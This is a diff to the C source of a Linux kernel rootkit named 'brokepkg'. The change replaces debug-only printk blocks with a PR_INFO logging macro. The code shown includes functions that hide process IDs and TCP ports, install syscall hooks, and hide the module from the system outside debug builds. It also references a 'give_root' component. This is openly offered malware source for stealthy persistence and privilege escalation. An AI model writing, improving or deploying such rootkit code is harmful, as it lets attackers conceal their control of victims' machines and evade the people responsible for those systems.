@@ -4,6 +4,7 @@
 #include "config.h"
 #include "give_root.h"
 #include "module_hide.h"
+#include "utils.h"
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
@@ -37,9 +38,7 @@ unsigned short hide_port[MAX_TCP_PORTS] = {0};
 
 void pid_hide(pid_t pid) {
   sprintf(hide_pid, "%d", pid);
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg: hiding process with pid %d\n", pid);
-#endif
+  PR_INFO("brokepkg: hiding process with pid %d\n", pid);
 }
 
 void port_hide(unsigned short port) {
@@ -47,9 +46,7 @@ void port_hide(unsigned short port) {
   for (i = 0; i < MAX_TCP_PORTS; i++) {
     if (hide_port[i] == 0) {
       hide_port[i] = port;
-#ifdef DEBUG
-      printk(KERN_INFO "Port %d hidden\n", port);
-#endif
+      PR_INFO("Port %d hidden\n", port);
       return;
     }
   }
@@ -60,9 +57,7 @@ void port_show(unsigned short port) {
   for (i = 0; i < MAX_TCP_PORTS; i++) {
     if (hide_port[i] == port) {
       hide_port[i] = 0;
-#ifdef DEBUG
-      printk(KERN_INFO "Port %d unhidden\n", port);
-#endif
+      PR_INFO("Port %d unhidden\n", port);
       return;
     }
   }
@@ -272,9 +267,8 @@ static int __init rootkit_init(void) {
   err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
   if (err) return err;
 
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg now is runing\n");
-#else
+  PR_INFO("brokepkg now is runing\n");
+#ifndef DEBUG
   module_hide();
 #endif
   tidy();
@@ -284,9 +278,7 @@ static int __init rootkit_init(void) {
 
 static void __exit rootkit_exit(void) {
   fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg unloaded, my work has completed\n");
-#endif
+  PR_INFO("brokepkg unloaded, my work has completed\n");
 }
 
 module_init(rootkit_init);
